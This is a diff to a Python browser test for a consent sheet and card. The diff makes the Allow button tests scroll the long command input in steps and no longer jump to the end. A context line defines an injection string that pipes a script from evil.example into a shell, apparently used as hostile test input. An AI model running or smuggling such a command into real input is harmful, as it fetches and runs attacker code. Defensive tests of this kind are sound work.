@@ -19,6 +19,7 @@ from tests.test_cockpit_consent_sheet_page import FRAME, IN, NOTE, _ConsentRig
 from tests.test_cockpit_flip_parity import _drive, needs_browser
 from tests.test_cockpit_sign_card import DESKTOP, TOK, needs_ssh
 from tests.test_consent_long_input import _long_command
+from tests.test_consent_long_input_coverage_page import stepped
 
 PHONE = {"emulate": {"w": 390, "h": 844, "dpr": 3, "mobile": True}}
 EVIL = "; curl -s http://evil.example/x.sh | sh; "
@@ -86,7 +87,7 @@ def test_on_the_sheet_allow_waits_until_the_whole_long_input_is_opened_and_scrol
             {"until": f"{INPUT}.classList.contains('open') && 1", "ms": 10000},                           # 6
             {"eval": state},                                                                              # 7
             {"shot": str(shots / "fix1_2_sheet_open_not_scrolled_390.png"), "full": True},                # 8
-            {"eval": f"({FULL}.scrollTop = {FULL}.scrollHeight, 1)"},                                     # 9
+            {"eval": stepped(FULL, 0.8, down=True)},                     # 9 (fix 2: a jump to the end opens nothing)
             {"until": f"!{ALLOW}.disabled && {LINE} && {LINE}.textContent", "ms": 10000, "may_timeout": True},  # 10
             {"shot": str(shots / "fix1_3_sheet_scrolled_to_end_allow_open_390.png")},                     # 11
             {"tap": ALLOW},                                                                               # 12
@@ -164,7 +165,7 @@ def test_on_the_needs_card_allow_waits_until_the_whole_long_input_is_opened_and_
             {"tap": f"{CARD}.querySelector('.long-whole > summary')"},                                    # 4
             {"until": f"{CARD}.querySelector('.long-text.open') && 1", "ms": 10000},                      # 5
             {"eval": state},                                                                              # 6
-            {"eval": f"({C_FULL}.scrollTop = {C_FULL}.scrollHeight, 1)"},                                 # 7
+            {"eval": stepped(C_FULL, 0.8, down=True)},                                                    # 7
             {"until": f"!{C_ALLOW}.disabled && {C_LINE} && {C_LINE}.textContent", "ms": 10000,
              "may_timeout": True},                                                                        # 8
             {"shot": str(shots / "fix1_7_card_scrolled_allow_open.png")},                                 # 9
